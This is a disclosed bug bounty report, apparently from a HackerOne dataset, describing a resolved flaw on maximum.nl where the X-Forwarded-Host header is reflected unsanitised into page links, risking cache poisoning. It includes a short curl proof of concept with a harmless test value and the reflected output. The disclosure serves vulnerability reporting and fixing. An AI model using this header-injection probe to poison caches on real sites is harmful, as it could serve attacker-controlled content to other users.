---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '737315'
original_report_id: '737315'
title: '''X-Forwarded-Host'' key used in input without sanitation - possible cache
  poisoning'
weakness: Resource Injection
team_handle: radancy
created_at: '2019-11-14T11:52:10.340Z'
disclosed_at: '2020-02-14T16:38:07.514Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 10
asset_identifier: '*.maximum.nl'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- resource-injection
---

# 'X-Forwarded-Host' key used in input without sanitation - possible cache poisoning

## Metadata

- HackerOne Report ID: 737315
- Weakness: Resource Injection
- Program: radancy
- Disclosed At: 2020-02-14T16:38:07.514Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Domain and URL:**
maximum.nl

**Summary:** 
The HTTP 'X-Forwarded-Host' is dynamically used in the application without sanitization, allowing an attacker control of the input key. This can allow for self-XSS, or when a CDN or caching service is deployed, risk the CDN caching the request and serving the injected payload to other users.

PoC:

```$ curl -v https://www.maximum.nl/ -H 'X-Forwarded-Host: exampleinject' 2>&1 | grep 'exampleinject'
                <link rel="alternate" hreflang="nl" type="application/atom+xml" href="https://exampleinject/feed-page" title="Page Feed">
                <link rel="alternate" hreflang="nl" type="application/atom+xml" href="https://exampleinject/feed-vacancy" title="Vacancy Feed">
    <meta property="og:url" content="https://exampleinject" />
```
Here my input is returned in the web applications response. When cached this it will return to other users.


## Steps To Reproduce:

See PoC

## Impact

Injected response being returned to users

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
